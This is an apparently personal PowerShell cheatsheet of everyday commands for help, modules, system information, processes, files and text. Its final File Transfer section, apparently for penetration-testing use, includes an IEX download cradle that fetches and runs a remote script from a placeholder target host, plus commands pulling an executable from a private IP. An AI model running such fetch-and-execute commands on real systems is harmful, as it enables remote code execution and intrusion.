# Powershell Cheatsheet

## Help

```powershell
# List all availible powershell cmdlets and funtions
Get-Command
gcm
gcm | select-string net

# List all cmdlets, funtions, commands, and path
gcm *
gcm *net*

# Help for command
get-help <cmdlet>
help <cmdlet
man <cmdlet>

# List all installed an availible modules
get-module -ListAvailible 

# List currently loaded modules
get-module
```



## Modules

```powershell
# List installed and availible modules
get-module -ListAvailible 

# List currently loaded modules
get-module

# Import a module
import-module <module>
import-module c:\path\to\module

# Re-import module
import-module <module> -Force 
# List cmds from module
get-command -module <module> 

```



## General

```powershell
# Get command history
get-history
h

# Search through command histroy
h | sls <pattern>

# records session to file
start-transcript c:\path\to\record\to.txt
stop-transcript
```



## System Information

```powershell
# Get computer name
$env:computername

# Check if part of domain
(get-wmiobject -Class win32_computersystem).partofdomain

# Workgroup Name
(get-wmiobject -Class win32_computersystem).workgroup
# Check is 32-bit or 64-bit
[System.Environment]::Is64BitOperatingSystem
(Get-CimInstance -ClassName win32_operatingsystem).OSArchitecture

# List installed software
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\Software | ft Name
Get-HotFix

# List ENV vars
get-childitem env:
gci env:

# See what drives are mounted to your file system 
get-psdrive -psprovider filesystem

# Display environment variables
Get-ChildItem env
Get-Childitem env:Path
```

## Proccesses

```powershell
# List proccesses
get-process
ps

# List process matching name
ps <pattern>

# List proccess matching pattern 
ps | out-string -stream | select-string <pattern>

# Kill process by PID
kill <pid>
kill -force <pid>

# Kill process by name
ps <name> | kill

```

## File System

```powershell
# pwd
get-location
gl

# Navigate
cd <path>
chdir <path>
si <path>

# List files
ls
dir
gci

# List hidden files
gci -Force

# List only hidden files
gci -Attributes !D+H

# List files recursively
gci -rec 
gci -rec -depth 1

# Unhide file or dir
(get-item test.txt -force).Attributes -= 'Hidden'
```

## Working with Files and Text

```powershell
# Read a File
gc file.txt
cat file.txt

# Sort and remove duplicated lines
gc file.txt | sort -u 

# Remove empty lines
(gc file.txt) | ? {$_.trim() -ne "" }

# Match Pattern -- grep
gc file.txt | select-string pattern
gc file.txt | sls pattern 

# Count number of lines
(gc file.txt).count
gc file.txt | measure -line

# Create empty file
sc file.txt -Value $null

# Read and replace a string
(gc file.txt).replace("abc","xyz").replace("def","opq")

# Read and replace multiple strings
$a = gc file.txt
$a -replace "abc","xyz" -replace "def","opq"
```



## Access Control

```powershell
# Get ACL of file path

# ACL of registry object


```



## File Transfer

```powershell
# Download a file
"IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1')"
wget -Uri "http://192.168.204.190/a.exe" -OutFile "C:\test\a.exe"
curl -Uri "http://192.168.204.190/a.exe" -OutFile "C:\test\a.exe"
iwr -Uri "http://192.168.204.190/a.exe" -OutFile "C:\test\a.exe"
(New-Object System.Net.WebClient).DownloadFile("http://192.168.204.190/a.exe","c:\test\a.exe")
Invoke-WebRequest -Uri "http://192.168.204.190/a.exe" -OutFile "C:\test\a.exe"

# 
```


